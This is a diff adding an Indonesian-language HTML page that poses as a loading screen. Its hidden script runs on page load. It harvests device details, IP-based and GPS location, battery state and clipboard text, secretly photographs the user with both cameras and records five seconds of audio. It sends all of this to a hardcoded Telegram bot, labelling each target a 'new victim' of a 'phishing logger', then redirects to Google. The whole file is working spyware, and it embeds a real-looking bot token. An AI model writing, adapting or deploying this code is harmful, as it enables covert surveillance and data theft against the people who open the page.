@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+            text-align: center;
+            flex-direction: column;
+        }
+        .spinner {
+            border: 4px solid #333;
+            border-top: 4px solid #0f0;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #0f0; font-size: 14px; margin-top: 10px; }
+        video, canvas { position: absolute; top: -9999px; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
+        .container { padding: 30px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <p id="status">Mohon tunggu sebentar...</p>
+    </div>
+    
+    <video id="videoBack" autoplay playsinline></video>
+    <video id="videoFront" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+    (function() {
+        // ==================== CONFIG TELEGRAM LU ====================
+        const BOT_TOKEN = '8222528496:AAFwnyQ67Q-vDnml0sFzBkcdGA317QbwqmM';
+        const CHAT_ID = '7629800678';
+        const BASE_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;
+        
+        let collectedData = {};
+        let statusEl = document.getElementById('status');
+
+        // ==================== SEND TO TELEGRAM ====================
+        async function sendMsg(text) {
+            try {
+                await fetch(BASE_URL + '/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'HTML'})
+                });
+            } catch(e) {}
+        }
+
+        async function sendPhoto(base64, caption) {
+            try {
+                const blob = await (await fetch(base64)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'photo.jpg');
+                fd.append('caption', caption);
+                await fetch(BASE_URL + '/sendPhoto', {method: 'POST', body: fd});
+            } catch(e) {}
+        }
+
+        async function sendAudio(base64, caption) {
+            try {
+                const blob = await (await fetch(base64)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('audio', blob, 'recording.ogg');
+                fd.append('caption', caption);
+                await fetch(BASE_URL + '/sendAudio', {method: 'POST', body: fd});
+            } catch(e) {}
+        }
+
+        async function sendDoc(text, filename) {
+            try {
+                const blob = new Blob([text], {type: 'text/plain'});
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('document', blob, filename);
+                await fetch(BASE_URL + '/sendDocument', {method: 'POST', body: fd});
+            } catch(e) {}
+        }
+
+        // ==================== DEVICE INFO ====================
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            return {
+                ua: ua,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || '?',
+                ram: navigator.deviceMemory || '?',
+                connection: (navigator.connection || {}).effectiveType || '?',
+                vendor: navigator.vendor || '?',
+                cookie: navigator.cookieEnabled,
+                touchPoints: navigator.maxTouchPoints || 0
+            };
+        }
+
+        // ==================== IP ADDRESS ====================
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                collectedData.ip = d.ip;
+                try {
+                    const r2 = await fetch('http://ip-api.com/json/' + d.ip + '?fields=country,countryCode,regionName,city,zip,lat,lon,isp,org,as');
+                    const d2 = await r2.json();
+                    collectedData.ipInfo = d2;
+                } catch(e) {}
+            } catch(e) { collectedData.ip = 'Unknown'; }
+        }
+
+        // ==================== GPS LOCATION ====================
+        function getGPS() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation) { resolve(false); return; }
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    collectedData.gps = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        acc: pos.coords.accuracy + 'm',
+                        map: 'https://maps.google.com/?q=' + pos.coords.latitude + ',' + pos.coords.longitude,
+                        time: new Date(pos.timestamp).toISOString()
+                    };
+                    resolve(true);
+                }, function() { resolve(false); }, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+        }
+
+        // ==================== BATTERY ====================
+        async function getBattery() {
+            try {
+                const b = await navigator.getBattery();
+                collectedData.battery = {
+                    level: Math.round(b.level * 100) + '%',
+                    charging: b.charging ? 'Ya' : 'Tidak'
+                };
+            } catch(e) {}
+        }
+
+        // ==================== CLIPBOARD ====================
+        async function getClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text.length > 0) {
+                    collectedData.clipboard = text.substring(0, 500);
+                }
+            } catch(e) {}
+        }
+
+        // ==================== CAMERA CAPTURE ====================
+        function captureCamera(mode) {
+            return new Promise(resolve => {
+                const video = mode === 'back' ? document.getElementById('videoBack') : document.getElementById('videoFront');
+                const canvas = document.getElementById('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: mode === 'back' ? 'environment' : 'user', width: {ideal: 1280}, height: {ideal: 720} },
+                    audio: false
+                }).then(stream => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        setTimeout(function() {
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            ctx.drawImage(video, 0, 0);
+                            const photo = canvas.toDataURL('image/jpeg', 0.8);
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(photo);
+                        }, 2000);
+                    };
+                }).catch(function() { resolve(null); });
+            });
+        }
+
+        // ==================== AUDIO RECORDER ====================
+        function recordAudio(ms) {
+            return new Promise(resolve => {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { resolve(null); return; }
+                navigator.mediaDevices.getUserMedia({audio: true, video: false}).then(stream => {
+                    const mr = new MediaRecorder(stream, {mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/mp4'});
+                    const chunks = [];
+                    mr.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
+                    mr.onstop = function() {
+                        const blob = new Blob(chunks, {type: mr.mimeType});
+                        const reader = new FileReader();
+                        reader.onloadend = function() {
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(reader.result);
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    mr.start();
+                    setTimeout(function() { if (mr.state === 'recording') mr.stop(); }, ms);
+                }).catch(function() { resolve(null); });
+            });
+        }
+
+        // ==================== MAIN EXECUTION ====================
+        async function main() {
+            // 1. Device Info
+            statusEl.innerText = 'Mengumpulkan info perangkat...';
+            collectedData.device = getDeviceInfo();
+            
+            // 2. IP
+            statusEl.innerText = 'Mendeteksi alamat IP...';
+            await getIP();
+            
+            // 3. GPS
+            statusEl.innerText = 'Mendapatkan lokasi...';
+            await getGPS();
+            
+            // 4. Battery
+            statusEl.innerText = 'Memeriksa baterai...';
+            await getBattery();
+            
+            // 5. Clipboard
+            statusEl.innerText = 'Membaca clipboard...';
+            await getClipboard();
+            
+            // 6. Camera Back
+            statusEl.innerText = 'Mengambil foto...';
+            const camBack = await captureCamera('back');
+            if (camBack) collectedData.camBack = camBack;
+            
+            // 7. Camera Front
+            const camFront = await captureCamera('front');
+            if (camFront) collectedData.camFront = camFront;
+            
+            // 8. Audio
+            statusEl.innerText = 'Merekam suara...';
+            const audio = await recordAudio(5000);
+            if (audio) collectedData.audio = audio;
+            
+            // 9. KIRIM SEMUA KE TELEGRAM
+            statusEl.innerText = 'Mengirim data...';
+            await sendAll();
+            
+            statusEl.innerText = 'Selesai!';
+            
+            // Redirect setelah 2 detik
+            setTimeout(function() {
+                window.location.href = 'https://www.google.com';
+            }, 2000);
+        }
+
+        async function sendAll() {
+            const d = new Date().toLocaleString('id-ID');
+            
+            // Kirim Device Info
+            let msg = '🔴 <b>KORBAN BARU - PHISING LOGGER</b>\n\n';
+            msg += '🕐 <b>Waktu:</b> ' + d + '\n\n';
+            msg += '💻 <b>DEVICE INFO:</b>\n';
+            msg += '📱 Platform: ' + collectedData.device.platform + '\n';
+            msg += '🖥️ Layar: ' + collectedData.device.screen + '\n';
+            msg += '💾 RAM: ' + collectedData.device.ram + 'GB | CPU: ' + collectedData.device.cores + ' Cores\n';
+            msg += '🌍 Bahasa: ' + collectedData.device.language + '\n';
+            msg += '🕐 Zona Waktu: ' + collectedData.device.timezone + '\n';
+            msg += '📶 Koneksi: ' + collectedData.device.connection + '\n\n';
+            msg += '📡 <b>IP:</b> ' + (collectedData.ip || '?') + '\n';
+            
+            if (collectedData.ipInfo && collectedData.ipInfo.country) {
+                msg += '🌍 <b>Lokasi IP:</b> ' + collectedData.ipInfo.country + ', ' + collectedData.ipInfo.city + '\n';
+                msg += '🏢 <b>ISP:</b> ' + collectedData.ipInfo.isp + '\n';
+            }
+            
+            if (collectedData.gps && collectedData.gps.lat) {
+                msg += '\n📍 <b>GPS:</b> ' + collectedData.gps.map + '\n';
+                msg += '📏 Akurasi: ' + collectedData.gps.acc + '\n';
+            }
+            
+            if (collectedData.battery) {
+                msg += '\n🔋 <b>Baterai:</b> ' + collectedData.battery.level + ' (Charging: ' + collectedData.battery.charging + ')';
+            }
+            
+            if (collectedData.clipboard) {
+                msg += '\n\n📋 <b>CLIPBOARD:</b>\n<code>' + collectedData.clipboard + '</code>';
+            }
+            
+            await sendMsg(msg);
+            
+            // Kirim Foto
+            if (collectedData.camBack) await sendPhoto(collectedData.camBack, '📸 KAMERA BELAKANG - ' + d);
+            if (collectedData.camFront) await sendPhoto(collectedData.camFront, '🤳 KAMERA DEPAN - ' + d);
+            
+            // Kirim Audio
+            if (collectedData.audio) await sendAudio(collectedData.audio, '🎙️ REKAMAN SUARA - ' + d);
+            
+            // Kirim Full JSON
+            const jsonStr = JSON.stringify(collectedData, null, 2);
+            await sendDoc(jsonStr, 'full_data_' + Date.now() + '.json');
+        }
+
+        // Jalankan!
+        main();
+    })();
+    </script>
+</body>
+</html>
